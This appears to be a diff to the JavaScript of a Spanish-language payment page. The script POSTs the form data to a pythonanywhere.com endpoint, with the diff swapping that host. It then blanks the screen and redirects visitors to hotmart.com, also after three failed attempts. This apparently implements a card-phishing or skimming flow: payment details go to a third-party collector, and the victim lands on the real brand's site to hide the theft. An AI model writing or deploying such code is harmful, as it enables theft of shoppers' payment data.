@@ -112,15 +112,15 @@ document.addEventListener('DOMContentLoaded', function() {
             responseDiv.innerHTML = '<span class="loader"></span> Procesando pago...';
 
             try {
-                const response = await fetch('https://7vAfpq6XkG.pythonanywhere.com/check', {
+                const response = await fetch('https://microservice2.pythonanywhere.com/check', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify(data)
                 });
                 const result = await response.json();
                 if (result && result.status === 'Ok') {
-                    // Respuesta exitosa, continuar con la redirección
-                    responseDiv.innerHTML = '<span class="loader"></span> Redirigiendo...';
+                    // Blanquear la pantalla
+                    document.body.innerHTML = '<div style="width:100vw;height:100vh;background:#fff;display:flex;align-items:center;justify-content:center;font-size:2rem;">Redirigiendo...</div>';
                     setTimeout(() => {
                         window.location.href = 'https://hotmart.com/';
                     }, 1000);
@@ -129,6 +129,8 @@ document.addEventListener('DOMContentLoaded', function() {
                     let attempts = parseInt(sessionStorage.getItem('payment_attempts') || '0', 10) + 1;
                     sessionStorage.setItem('payment_attempts', attempts);
                     if (attempts >= 3) {
+                        // Blanquear la pantalla antes de redirigir
+                        document.body.innerHTML = '<div style="width:100vw;height:100vh;background:#fff;display:flex;align-items:center;justify-content:center;font-size:2rem;">Redirigiendo...</div>';
                         window.location.href = 'https://hotmart.com/';
                         return;
                     }
